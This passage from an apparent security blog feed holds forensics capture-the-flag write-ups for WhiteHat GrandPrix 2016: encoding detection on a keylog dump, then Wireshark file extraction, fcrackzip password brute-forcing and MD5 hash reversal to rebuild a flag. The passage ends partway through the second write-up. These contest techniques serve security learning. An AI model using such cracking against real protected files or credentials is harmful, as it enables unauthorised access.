class="line">ISO-8859-10  ok: ISO-8859-10</div><div class="line">ISO8859-10  ok: ISO8859-10</div><div class="line">ISO_8859-10:1992  ok: ISO_8859-10:1992</div><div class="line">ISO_8859-1:1987  ok: ISO_8859-1:1987</div><div class="line">ISO885913  ok: ISO885913</div><div class="line">ISO-8859-13  ok: ISO-8859-13</div><div class="line">ISO8859-13  ok: ISO8859-13</div><div class="line">ISO885914  ok: ISO885914</div><div class="line">ISO_8859-14  ok: ISO_8859-14</div><div class="line">ISO-8859-14  ok: ISO-8859-14</div><div class="line">ISO8859-14  ok: ISO8859-14</div><div class="line">ISO_8859-14:1998  ok: ISO_8859-14:1998</div><div class="line">ISO885915  ok: ISO885915</div><div class="line">ISO_8859-15  ok: ISO_8859-15</div><div class="line">ISO-8859-15  ok: ISO-8859-15</div><div class="line">ISO8859-15  ok: ISO8859-15</div><div class="line">ISO_8859-15:1998  ok: ISO_8859-15:1998</div><div class="line">ISO885916  ok: ISO885916</div><div class="line">ISO_8859-16  ok: ISO_8859-16</div><div class="line">ISO-8859-16  ok: ISO-8859-16</div><div class="line">ISO8859-16  ok: ISO8859-16</div><div class="line">ISO_8859-16:2001  ok: ISO_8859-16:2001</div><div class="line">ISO88592  ok: ISO88592</div><div class="line">ISO_8859-2  ok: ISO_8859-2</div><div class="line">ISO-8859-2  ok: ISO-8859-2</div><div class="line">ISO8859-2  ok: ISO8859-2</div><div class="line">ISO_8859-2:1987  ok: ISO_8859-2:1987</div><div class="line">ISO88594  ok: ISO88594</div><div class="line">ISO_8859-4  ok: ISO_8859-4</div><div class="line">ISO-8859-4  ok: ISO-8859-4</div><div class="line">ISO8859-4  ok: ISO8859-4</div><div class="line">ISO_8859-4:1988  ok: ISO_8859-4:1988</div><div class="line">ISO88595  ok: ISO88595</div><div class="line">ISO_8859-5  ok: ISO_8859-5</div><div class="line">ISO-8859-5  ok: ISO-8859-5</div><div class="line">ISO8859-5  ok: ISO8859-5</div><div class="line">ISO_8859-5:1988  ok: ISO_8859-5:1988</div><div class="line">ISO88599  ok: ISO88599</div><div class="line">ISO_8859-9  ok: ISO_8859-9</div><div class="line">ISO-8859-9  ok: ISO-8859-9</div><div class="line">ISO8859-9  ok: ISO8859-9</div><div class="line">ISO_8859-9:1989  ok: ISO_8859-9:1989</div><div class="line">ISO88599E  ok: ISO88599E</div><div class="line">ISO_8859-9E  ok: ISO_8859-9E</div><div class="line">ISO-8859-9E  ok: ISO-8859-9E</div><div class="line">ISO8859-9E  ok: ISO8859-9E</div><div class="line">ISO-CELTIC  ok: ISO-CELTIC</div><div class="line">ISO-IR-100  ok: ISO-IR-100</div><div class="line">ISO-IR-101  ok: ISO-IR-101</div><div class="line">ISO-IR-110  ok: ISO-IR-110</div><div class="line">ISO-IR-111  ok: ISO-IR-111</div><div class="line">ISO-IR-139  ok: ISO-IR-139</div><div class="line">ISO-IR-143  ok: ISO-IR-143</div><div class="line">ISO-IR-144  ok: ISO-IR-144</div><div class="line">ISO-IR-148  ok: ISO-IR-148</div><div class="line">ISO-IR-156  ok: ISO-IR-156</div><div class="line">ISO-IR-157  ok: ISO-IR-157</div><div class="line">ISO-IR-179  ok: ISO-IR-179</div><div class="line">ISO-IR-199  ok: ISO-IR-199</div><div class="line">ISO-IR-203  ok: ISO-IR-203</div><div class="line">ISO-IR-226  ok: ISO-IR-226</div><div class="line">ISO/TR_11548-1/  ok: ISO/TR_11548-1/</div><div class="line">KOI8R  ok: KOI8R</div><div class="line">KOI8-R  ok: KOI8-R</div><div class="line">KOI8-RU  ok: KOI8-RU</div><div class="line">KOI8U  ok: KOI8U</div><div class="line">KOI8-U  ok: KOI8-U</div><div class="line">L1  ok: L1</div><div class="line">L10  ok: L10</div><div class="line">L2  ok: L2</div><div class="line">L4  ok: L4</div><div class="line">L5  ok: L5</div><div class="line">L6  ok: L6</div><div class="line">L7  ok: L7</div><div class="line">L8  ok: L8</div><div class="line">LATIN1  ok: LATIN1</div><div class="line">LATIN10  ok: LATIN10</div><div class="line">LATIN2  ok: LATIN2</div><div class="line">LATIN4  ok: LATIN4</div><div class="line">LATIN5  ok: LATIN5</div><div class="line">LATIN6  ok: LATIN6</div><div class="line">LATIN7  ok: LATIN7</div><div class="line">LATIN8  ok: LATIN8</div><div class="line">LATIN9  ok: LATIN9</div><div class="line">LATIN-9  ok: LATIN-9</div><div class="line">MAC  ok: MAC</div><div class="line">MAC-CENTRALEUROPE  ok: MAC-CENTRALEUROPE</div><div class="line">MACCYRILLIC  ok: MACCYRILLIC</div><div class="line">MAC-CYRILLIC  ok: MAC-CYRILLIC</div><div class="line">MACINTOSH  ok: MACINTOSH</div><div class="line">MACIS  ok: MACIS</div><div class="line">MAC-IS  ok: MAC-IS</div><div class="line">MAC-SAMI  ok: MAC-SAMI</div><div class="line">MACUK  ok: MACUK</div><div class="line">MAC-UK  ok: MAC-UK</div><div class="line">MACUKRAINIAN  ok: MACUKRAINIAN</div><div class="line">MIK  ok: MIK</div><div class="line">MS-ARAB  ok: MS-ARAB</div><div class="line">MS-CYRL  ok: MS-CYRL</div><div class="line">MSMACCYRILLIC  ok: MSMACCYRILLIC</div><div class="line">MS-MAC-CYRILLIC  ok: MS-MAC-CYRILLIC</div><div class="line">OSF00010001  ok: OSF00010001</div><div class="line">OSF00010002  ok: OSF00010002</div><div class="line">OSF00010004  ok: OSF00010004</div><div class="line">OSF00010005  ok: OSF00010005</div><div class="line">OSF00010009  ok: OSF00010009</div><div class="line">OSF0001000A  ok: OSF0001000A</div><div class="line">OSF00010100  ok: OSF00010100</div><div class="line">OSF00010101  ok: OSF00010101</div><div class="line">OSF00010102  ok: OSF00010102</div><div class="line">OSF10020025  ok: OSF10020025</div><div class="line">OSF10020111  ok: OSF10020111</div><div class="line">OSF10020115  ok: OSF10020115</div><div class="line">OSF10020116  ok: OSF10020116</div><div class="line">OSF10020118  ok: OSF10020118</div><div class="line">OSF1002011C  ok: OSF1002011C</div><div class="line">OSF1002011D  ok: OSF1002011D</div><div class="line">OSF10020129  ok: OSF10020129</div><div class="line">OSF100201B5  ok: OSF100201B5</div><div class="line">OSF100201F4  ok: OSF100201F4</div><div class="line">OSF10020352  ok: OSF10020352</div><div class="line">OSF10020354  ok: OSF10020354</div><div class="line">OSF10020357  ok: OSF10020357</div><div class="line">OSF1002035D  ok: OSF1002035D</div><div class="line">OSF1002035E  ok: OSF1002035E</div><div class="line">OSF1002035F  ok: OSF1002035F</div><div class="line">OSF10020366  ok: OSF10020366</div><div class="line">OSF10020367  ok: OSF10020367</div><div class="line">OSF10020370  ok: OSF10020370</div><div class="line">OSF10020402  ok: OSF10020402</div><div class="line">OSF10020417  ok: OSF10020417</div><div class="line">PT154  ok: PT154</div><div class="line">RK1048  ok: RK1048</div><div class="line">RUSCII  ok: RUSCII</div><div class="line">STRK1048-2002  ok: STRK1048-2002</div><div class="line">TCVN  ok: TCVN</div><div class="line">TCVN-5712  ok: TCVN-5712</div><div class="line">TCVN5712-1  ok: TCVN5712-1</div><div class="line">TCVN5712-1:1993  ok: TCVN5712-1:1993</div><div class="line">TS-5881  ok: TS-5881</div><div class="line">UCS2  ok: UCS2</div><div class="line">UCS-2  ok: UCS-2</div><div class="line">UCS-2BE  ok: UCS-2BE</div><div class="line">UCS-2LE  ok: UCS-2LE</div><div class="line">UNICODE  ok: UNICODE</div><div class="line">UNICODEBIG  ok: UNICODEBIG</div><div class="line">UNICODELITTLE  ok: UNICODELITTLE</div><div class="line">UTF16  ok: UTF16</div><div class="line">UTF-16  ok: UTF-16</div><div class="line">UTF16BE  ok: UTF16BE</div><div class="line">UTF-16BE  ok: UTF-16BE</div><div class="line">UTF16LE  ok: UTF16LE</div><div class="line">UTF-16LE  ok: UTF-16LE</div><div class="line">VISCII  ok: VISCII</div><div class="line">WINDOWS-1251  ok: WINDOWS-1251</div><div class="line">WINDOWS-1256  ok: WINDOWS-1256</div></pre></td></tr></table></figure>
<ul>
<li>Tried UTF-16, UNICODELITTLE, UNICODE, LATIN1, ISO-8859-1 WINDOWS-1251, CP1251 with <code>iconv</code>.</li>
<li><p>Tried <code>enca</code> recognition:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]</div><div class="line">$ enca -f keylog.log_file.None.0x80eb7008.dat</div><div class="line">enca: Cannot determine (or understand) your language preferences.</div><div class="line">Please use `-L language&apos;, or `-L none&apos; if your language is not supported</div><div class="line">(only a few multibyte encodings can be recognized then).</div><div class="line">Run `enca --list languages&apos; to get a list of supported languages.</div></pre></td></tr></table></figure>
</li>
<li><p>Tried <code>chardet</code> (not even a relevent output):</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]</div><div class="line">$ chardetect keylog.log_file.None.0x80eb7008.dat</div><div class="line">keylog.log_file.None.0x80eb7008.dat: windows-1253 with confidence 0.3253156807138245</div></pre></td></tr></table></figure>
<h2 id="Submit"><a href="#Submit" class="headerlink" title="Submit"></a>Submit</h2>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>WhiteHat GrandPrix - 100 - Banh Giay - Forensics</title>
    <link href="http://rawsec.ml/en/WhiteHat-GrandPrix-2016-forensics-100-Banh-Giay/"/>
    <id>http://rawsec.ml/en/WhiteHat-GrandPrix-2016-forensics-100-Banh-Giay/</id>
    <published>2016-12-16T23:00:00.000Z</published>
    <updated>2016-12-18T15:46:13.777Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : WhiteHat GrandPrix 2016</li>
<li><strong>Website</strong> : <a href="https://grandprix.whitehatvn.com/Contests/ChallengesContest/32" target="_blank" rel="external">grandprix.whitehatvn.com</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/398" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p>Submit: WhiteHat{SHA1(flag)}</p>
<p><a href="http://material.grandprix.whitehatvn.com/gp2016/For01_7afbfe8847d67c8dd51d7227091bb9aaaafe11f3.zip" target="_blank" rel="external">http://material.grandprix.whitehatvn.com/gp2016/For01_7afbfe8847d67c8dd51d7227091bb9aaaafe11f3.zip</a></p>
<p><a href="http://bakmaterial.grandprix.whitehatvn.com/gp2016/For01_7afbfe8847d67c8dd51d7227091bb9aaaafe11f3.zip" target="_blank" rel="external">http://bakmaterial.grandprix.whitehatvn.com/gp2016/For01_7afbfe8847d67c8dd51d7227091bb9aaaafe11f3.zip</a></p>
<p>Alternative server on amazon in case of low traffic:</p>
<p><a href="http://54.183.97.137/gp2016/For01_7afbfe8847d67c8dd51d7227091bb9aaaafe11f3.zip" target="_blank" rel="external">http://54.183.97.137/gp2016/For01_7afbfe8847d67c8dd51d7227091bb9aaaafe11f3.zip</a></p>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ul>
<li>Download the zip.</li>
<li>Extract it.</li>
<li>Open the pcapng with <a href="https://www.wireshark.org/" target="_blank" rel="external">Wireshark</a>.</li>
<li>Filter <code>http</code> requests.</li>
<li>See frame n°134 <code>GET /corporation/secret HTTP/1.1</code>.</li>
<li>Extract the file (File &gt; Export Objects &gt; HTTP).</li>
<li>Check the type of file:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016]</div><div class="line">$ file secret</div><div class="line">secret: Zip archive data, at least v2.0 to extract</div></pre></td></tr></table></figure>
<ul>
<li>Unzip it:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016]</div><div class="line">$ unzip secret</div><div class="line">Archive:  secret</div><div class="line">[secret] EasyExtrack password:</div></pre></td></tr></table></figure>
<ul>
<li>Ok, there is a pasword, let’s check the html page: frame n°149 <code>GET /corporation/arsenal.html HTTP/1.1</code>.</li>
<li>Extract it from the pcapng.</li>
<li>See the hint: <code>For H.i.n.t: Referring to arsenal, i remember a number. It also length of secret p.a.s.s.w.o.r.d</code>.</li>
<li>One key event is:</li>
</ul>
<blockquote>
<p>30 October: Arsenal recorded victory in the League Cup to a record-breaking 7–5 scoreline at the Madjeski Stadium, having been 4–0 down initially. The game had the most goals ever scored in a single League Cup match (12).</p>
</blockquote>
<ul>
<li>With luck and guessing I found this number was <strong>4</strong>.</li>
<li>So now let’s try to crack the zip password with <a href="http://manpages.ubuntu.com/manpages/precise/man1/fcrackzip.1.html" target="_blank" rel="external"><code>fcrackzip</code></a>:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016]</div><div class="line">$ fcrackzip -b -c a -l 4 -u secret</div><div class="line"></div><div class="line">PASSWORD FOUND!!!!: pw == fuzu</div></pre></td></tr></table></figure>
<ul>
<li>Extract the zip with the password.</li>
<li>Check what file type <code>EasyExtrack</code> is:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016]</div><div class="line">$ file EasyExtrack</div><div class="line">EasyExtrack: Zip archive data, at least v1.0 to extract</div></pre></td></tr></table></figure>
<ul>
<li>Try to unzip it with the same password:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016]</div><div class="line">$ unzip EasyExtrack -d out</div><div class="line">Archive:  EasyExtrack</div><div class="line">   creating: out/EasyExtrack/</div><div class="line">[EasyExtrack] EasyExtrack/flag1.txt password:</div><div class="line">  inflating: out/EasyExtrack/flag1.txt  </div><div class="line">  inflating: out/EasyExtrack/flag10.txt  </div><div class="line">  inflating: out/EasyExtrack/flag11.txt  </div><div class="line">  inflating: out/EasyExtrack/flag12.txt  </div><div class="line">  inflating: out/EasyExtrack/flag13.txt  </div><div class="line">  inflating: out/EasyExtrack/flag14.txt  </div><div class="line">  inflating: out/EasyExtrack/flag15.txt  </div><div class="line">  inflating: out/EasyExtrack/flag16.txt  </div><div class="line">  inflating: out/EasyExtrack/flag17.txt  </div><div class="line">  inflating: out/EasyExtrack/flag18.txt  </div><div class="line">  inflating: out/EasyExtrack/flag19.txt  </div><div class="line">  inflating: out/EasyExtrack/flag2.txt  </div><div class="line">  inflating: out/EasyExtrack/flag20.txt  </div><div class="line">  inflating: out/EasyExtrack/flag21.txt  </div><div class="line">  inflating: out/EasyExtrack/flag22.txt  </div><div class="line">  inflating: out/EasyExtrack/flag23.txt  </div><div class="line">  inflating: out/EasyExtrack/flag24.txt  </div><div class="line">  inflating: out/EasyExtrack/flag25.txt  </div><div class="line">  inflating: out/EasyExtrack/flag26.txt  </div><div class="line">  inflating: out/EasyExtrack/flag27.txt  </div><div class="line">  inflating: out/EasyExtrack/flag28.txt  </div><div class="line">  inflating: out/EasyExtrack/flag29.txt  </div><div class="line">  inflating: out/EasyExtrack/flag3.txt  </div><div class="line">  inflating: out/EasyExtrack/flag30.txt  </div><div class="line">  inflating: out/EasyExtrack/flag4.txt  </div><div class="line">  inflating: out/EasyExtrack/flag5.txt  </div><div class="line">  inflating: out/EasyExtrack/flag6.txt  </div><div class="line">  inflating: out/EasyExtrack/flag7.txt  </div><div class="line">  inflating: out/EasyExtrack/flag8.txt  </div><div class="line">  inflating: out/EasyExtrack/flag9.txt</div></pre></td></tr></table></figure>
<ul>
<li>Here are all the flags:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;12f54a96f6444324693t0da001cafda8b&#125;</div><div class="line">raw: Flag&#123;60b725f10c9c85c70d9h7880dfe8191b3&#125;</div><div class="line">raw: Flag&#123;f5302386464f953ed58u1edac03556e55&#125;</div><div class="line">raw: Flag&#123;d9bed3b7e151f11b8fdyadf75f1db96d9&#125;</div><div class="line">raw: Flag&#123;3b5d5c3712955042212n316173ccf37be&#125;</div><div class="line">raw: Flag&#123;72cfd272ace172fa3502h6445fbef9b03&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;9a8ad92c50cae39aa2c5604pfd0ab6d8c&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;</div><div class="line">raw: Flag&#123;12f54a96f64443s246930da001cafda8b&#125;</div><div class="line">raw: Flag&#123;92520a5a9cf8932i20b9cd447f585f144&#125;</div><div class="line">raw: Flag&#123;01fbdc44ef819db6p273bc30965a23814&#125;</div><div class="line">raw: Flag&#123;9ffbf43126e33be52hcd2bf7e01d627f9&#125;</div><div class="line">raw: Flag&#123;12f54a96f644432469o30da001cafda8b&#125;</div><div class="line">raw: Flag&#123;9d7bf075372908f55e2nd945c39e0a613&#125;</div><div class="line">raw: Flag&#123;92520a5a9cf893220b9cud447f585f144&#125;</div><div class="line">raw: Flag&#123;009520053b00386d1173fu3988c55d192&#125;</div><div class="line">raw: Flag&#123;e73af36376314c7c0022cbk1d204f76b3&#125;</div><div class="line">raw: Flag&#123;e85dde330c34efb0e526ee3j082e4353b&#125;</div><div class="line">raw: Flag&#123;7d9d25f71cb8a5aba8620254l0a20d405&#125;</div></pre></td></tr></table></figure>
<ul>
<li>Flags are not hashes because they are 33 char long. But we can see there is one non-hex char in each flag.</li>
<li>Remove each non-hex flag to get 32 char long MD5 hashed:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">12f54a96f64443246930da001cafda8b</div><div class="line">60b725f10c9c85c70d97880dfe8191b3</div><div class="line">f5302386464f953ed581edac03556e55</div><div class="line">d9bed3b7e151f11b8fdadf75f1db96d9</div><div class="line">3b5d5c3712955042212316173ccf37be</div><div class="line">72cfd272ace172fa35026445fbef9b03</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">9a8ad92c50cae39aa2c5604fd0ab6d8c</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">d2a33790e5bf28b33cdbf61722a06989</div><div class="line">12f54a96f64443246930da001cafda8b</div><div class="line">92520a5a9cf893220b9cd447f585f144</div><div class="line">01fbdc44ef819db6273bc30965a23814</div><div class="line">9ffbf43126e33be52cd2bf7e01d627f9</div><div class="line">12f54a96f64443246930da001cafda8b</div><div class="line">9d7bf075372908f55e2d945c39e0a613</div><div class="line">92520a5a9cf893220b9cd447f585f144</div><div class="line">009520053b00386d1173f3988c55d192</div><div class="line">e73af36376314c7c0022cb1d204f76b3</div><div class="line">e85dde330c34efb0e526ee3082e4353b</div><div class="line">7d9d25f71cb8a5aba86202540a20d405</div></pre></td></tr></table></figure>
<ul>
<li>The extracted wrong letters are (in order): <code>xthuynhxxxpxxxxxxxxsiphonuukjl</code>.</li>
<li>Use <a href="https://hashkiller.co.uk/md5-decrypter.aspx" target="_blank" rel="external">hashkiller.co.uk</a> to decrypt MD5 hashes:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">12f54a96f64443246930da001cafda8b MD5 : l</div><div class="line">60b725f10c9c85c70d97880dfe8191b3 MD5 : a</div><div class="line">f5302386464f953ed581edac03556e55 MD5 : g</div><div class="line">d9bed3b7e151f11b8fdadf75f1db96d9 MD5 : &#123;</div><div class="line">3b5d5c3712955042212316173ccf37be MD5 : b</div><div class="line">72cfd272ace172fa35026445fbef9b03 MD5 : r</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">9a8ad92c50cae39aa2c5604fd0ab6d8c MD5 : f</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">d2a33790e5bf28b33cdbf61722a06989 MD5 : F</div><div class="line">12f54a96f64443246930da001cafda8b MD5 : l</div><div class="line">92520a5a9cf893220b9cd447f585f144 MD5 : _</div><div class="line">01fbdc44ef819db6273bc30965a23814 MD5 : h</div><div class="line">9ffbf43126e33be52cd2bf7e01d627f9 MD5 : e</div><div class="line">12f54a96f64443246930da001cafda8b MD5 : l</div><div class="line">9d7bf075372908f55e2d945c39e0a613 MD5 : p</div><div class="line">92520a5a9cf893220b9cd447f585f144 MD5 : _</div><div class="line">009520053b00386d1173f3988c55d192 MD5 : y</div><div class="line">e73af36376314c7c0022cb1d204f76b3 MD5 : o</div><div class="line">e85dde330c34efb0e526ee3082e4353b MD5 : u</div><div class="line">7d9d25f71cb8a5aba86202540a20d405 MD5 : &#125;</div></pre></td></tr></table></figure>
<ul>
<li>Unformated flag is: <code>Flag{brFFFfFFFFFFFFl_help_you}</code>.</li>
<li>SHA1 the unformated flag:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/out/EasyExtrack]</div><div class="line">$ printf %s &apos;Flag&#123;brFFFfFFFFFFFFl_help_you&#125;&apos; | sha1sum</div><div class="line">e7643ccd180c84176ae0b4361c3b169fceacf961  -</div></pre></td></tr></table></figure>
<ul>
<li>Format the flag: <code>WhiteHat{e7643ccd180c84176ae0b4361c3b169fceacf961}</code>.</li>
<li>Not the good flag …</li>
</ul>
<p>Note that <code>800618943025315f869e4e1f09471012</code> is the right md5 hash for <code>F</code> and <code>d2a33790e5bf28b33cdbf61722a06989</code> is the wrong md5 hash for <code>F</code> that you can obtain with non POSIX tools like echo (that’s why I use printf). So only hashkiller knows both wrong and right hash, all other md5 decrypt online tools knows only the right one so they are not able to decrypt <code>d2a33790e5bf28b33cdbf61722a06989</code>. But anyway…</p>
<ul>
<li>You know what? After some wasted hours I figured that I needed to replace <code>F</code> with some guessed letters:  <code>Flag{bruteforce_will_help_you}</code>. Yes guessing again.</li>
<li>SHA1 the unformated flag:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/out/EasyExtrack]</div><div class="line">$ printf %s &apos;Flag&#123;bruteforce_will_help_you&#125;&apos; | sha1sum</div><div class="line">1e71b26aa01733cd13e5199386c70fe31df43deb  -</div></pre></td></tr></table></figure>
<ul>
<li>Format the flag: <code>WhiteHat{1e71b26aa01733cd13e5199386c70fe31df43deb}</code>.</li>
<li>Not the good flag …</li>
<li>Description said <code>Submit: WhiteHat{SHA1(flag)}</code>, it depends if <code>flag</code> means <code>Flag{xxx}</code> or <code>xxx</code>.</li>
<li>SHA1 the unformated flag:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/out/EasyExtrack]</div><div class="line">$ printf %s &apos;bruteforce_will_help_you&apos; | sha1sum                                                                    </div><div class="line">31bd8aa56447ea1c703d0943e175a06a5c4ee614  -</div></pre></td></tr></table></figure>
<ul>
